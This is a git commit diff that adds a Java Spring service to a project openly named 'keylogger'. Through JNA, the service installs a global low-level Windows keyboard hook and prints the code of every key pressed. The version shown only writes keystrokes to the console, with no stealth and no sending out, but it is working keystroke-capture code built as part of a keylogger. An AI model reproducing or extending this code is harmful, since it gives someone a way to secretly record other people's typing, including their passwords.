9ac4962b0dd4c01f87d8da702d4c276d3b40b00a
Badar Al-Busaidi <bader5uk@hotmail.com>
2025-04-29 14:32:22 +0400

    adjusted the controller and shifted it to a sservice

---
+++ src/main/java/com/badar/keylogger/Services/GlobalKeyListenerService.java
@@ -0,0 +1,49 @@
+package com.badar.keylogger.Services;
+
+import com.sun.jna.Pointer;
+import com.sun.jna.platform.win32.*;
+import com.sun.jna.platform.win32.WinDef.LRESULT;
+import com.sun.jna.platform.win32.WinDef.WPARAM;
+import com.sun.jna.platform.win32.WinUser.*;
+import org.springframework.stereotype.Service;
+
+@Service
+public class GlobalKeyListenerService {
+    private static HHOOK hHook;
+    private static final User32 user32 = User32.INSTANCE;
+
+    public static void main(String[] args) {
+        LowLevelKeyboardProc keyboardHook = new LowLevelKeyboardProc() {
+            public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {
+                if (nCode >= 0) {
+                    if (wParam.intValue() == WinUser.WM_KEYDOWN) {
+                        System.out.println("Key pressed: " + info.vkCode);
+                    }
+                }
+                // CORRECT: Use Pointer.peer to get the native long value
+                return user32.CallNextHookEx(
+                        hHook,
+                        nCode,
+                        wParam,
+                        new WinDef.LPARAM(Pointer.nativeValue(info.getPointer()))
+                );
+            }
+        };
+
+        hHook = user32.SetWindowsHookEx(
+                WinUser.WH_KEYBOARD_LL,
+                keyboardHook,
+                Kernel32.INSTANCE.GetModuleHandle(null),
+                0
+        );
+
+        // Message loop
+        MSG msg = new MSG();
+        while (user32.GetMessage(msg, null, 0, 0) != 0) {
+            user32.TranslateMessage(msg);
+            user32.DispatchMessage(msg);
+        }
+
+        user32.UnhookWindowsHookEx(hHook);
+    }
+}
